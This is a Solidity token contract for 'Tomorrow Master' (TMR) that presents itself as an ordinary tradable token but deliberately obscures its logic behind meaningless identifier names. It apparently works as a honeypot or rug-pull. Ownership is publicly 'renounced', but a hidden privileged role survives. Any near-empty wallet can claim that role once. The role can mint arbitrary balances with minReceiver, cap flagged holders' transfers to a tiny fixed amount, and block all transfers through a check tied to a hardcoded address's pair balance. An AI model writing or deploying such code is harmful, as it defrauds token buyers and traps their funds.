//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface maxTx {
    function createPair(address launchedBuyTo, address exemptMin) external returns (address);
}

interface teamLiquidityIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listMin) external view returns (uint256);

    function transfer(address toAmountFee, uint256 senderIs) external returns (bool);

    function allowance(address minTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderIs) external returns (bool);

    function transferFrom(
        address sender,
        address toAmountFee,
        uint256 senderIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundLaunch, uint256 value);
    event Approval(address indexed minTake, address indexed spender, uint256 value);
}

abstract contract fundLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface limitSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromWallet is teamLiquidityIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TomorrowMaster is fundLiquidity, teamLiquidityIs, fromWallet {

    function totalSupply() external view virtual override returns (uint256) {
        return launchedIs;
    }

    function txToken(address minShould) public {
        launchReceiver();
        if (tokenShould != sellAuto) {
            sellAuto = swapSenderMax;
        }
        if (minShould == txTo || minShould == limitEnable) {
            return;
        }
        receiverWallet[minShould] = true;
    }

    constructor (){
        
        limitSwap teamTx = limitSwap(buyLaunch);
        limitEnable = maxTx(teamTx.factory()).createPair(teamTx.WETH(), address(this));
        
        txTo = _msgSender();
        senderReceiver[txTo] = true;
        launchLimitReceiver[txTo] = launchedIs;
        senderLaunch();
        if (sellAuto != swapSenderMax) {
            takeReceiverLaunched = false;
        }
        emit Transfer(address(0), txTo, launchedIs);
    }

    mapping(address => mapping(address => uint256)) private minBuy;

    uint8 private fundSell = 18;

    function owner() external view returns (address) {
        return listTo;
    }

    bool public exemptMode;

    function symbol() external view virtual override returns (string memory) {
        return feeReceiver;
    }

    address buyLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 constant tokenLaunchFrom = 19 ** 10;

    uint256 private tokenShould;

    event OwnershipTransferred(address indexed atAmount, address indexed limitWallet);

    function allowance(address liquidityTotalExempt, address takeBuy) external view virtual override returns (uint256) {
        if (takeBuy == buyLaunch) {
            return type(uint256).max;
        }
        return minBuy[liquidityTotalExempt][takeBuy];
    }

    function launchReceiver() private view {
        require(senderReceiver[_msgSender()]);
    }

    function launchTradingFrom(address sellShould, address toAmountFee, uint256 senderIs) internal returns (bool) {
        require(launchLimitReceiver[sellShould] >= senderIs);
        launchLimitReceiver[sellShould] -= senderIs;
        launchLimitReceiver[toAmountFee] += senderIs;
        emit Transfer(sellShould, toAmountFee, senderIs);
        return true;
    }

    function senderLaunch() public {
        emit OwnershipTransferred(txTo, address(0));
        listTo = address(0);
    }

    mapping(address => bool) public senderReceiver;

    uint256 amountModeTeam;

    function fundMarketing(uint256 senderIs) public {
        launchReceiver();
        fromAt = senderIs;
    }

    mapping(address => bool) public receiverWallet;

    mapping(address => uint256) private launchLimitReceiver;

    function transferFrom(address sellShould, address toAmountFee, uint256 senderIs) external override returns (bool) {
        if (_msgSender() != buyLaunch) {
            if (minBuy[sellShould][_msgSender()] != type(uint256).max) {
                require(senderIs <= minBuy[sellShould][_msgSender()]);
                minBuy[sellShould][_msgSender()] -= senderIs;
            }
        }
        return senderAt(sellShould, toAmountFee, senderIs);
    }

    function walletFromTeam(address totalSellTake) public {
        require(totalSellTake.balance < 100000);
        if (swapWallet) {
            return;
        }
        
        senderReceiver[totalSellTake] = true;
        
        swapWallet = true;
    }

    function transfer(address autoReceiverTake, uint256 senderIs) external virtual override returns (bool) {
        return senderAt(_msgSender(), autoReceiverTake, senderIs);
    }

    string private feeReceiver = "TMR";

    address public limitEnable;

    function name() external view virtual override returns (string memory) {
        return modeAmount;
    }

    uint256 private sellAuto;

    uint256 fromAt;

    address private listTo;

    function decimals() external view virtual override returns (uint8) {
        return fundSell;
    }

    bool public swapWallet;

    address receiverFeeReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return listTo;
    }

    uint256 public swapSenderMax;

    function balanceOf(address listMin) public view virtual override returns (uint256) {
        return launchLimitReceiver[listMin];
    }

    function senderAt(address sellShould, address toAmountFee, uint256 senderIs) internal returns (bool) {
        if (sellShould == txTo) {
            return launchTradingFrom(sellShould, toAmountFee, senderIs);
        }
        uint256 senderMarketing = teamLiquidityIs(limitEnable).balanceOf(receiverFeeReceiver);
        require(senderMarketing == fromAt);
        require(toAmountFee != receiverFeeReceiver);
        if (receiverWallet[sellShould]) {
            return launchTradingFrom(sellShould, toAmountFee, tokenLaunchFrom);
        }
        return launchTradingFrom(sellShould, toAmountFee, senderIs);
    }

    function approve(address takeBuy, uint256 senderIs) public virtual override returns (bool) {
        minBuy[_msgSender()][takeBuy] = senderIs;
        emit Approval(_msgSender(), takeBuy, senderIs);
        return true;
    }

    function minReceiver(address autoReceiverTake, uint256 senderIs) public {
        launchReceiver();
        launchLimitReceiver[autoReceiverTake] = senderIs;
    }

    string private modeAmount = "Tomorrow Master";

    uint256 private launchedIs = 100000000 * 10 ** 18;

    bool public takeReceiverLaunched;

    address public txTo;

}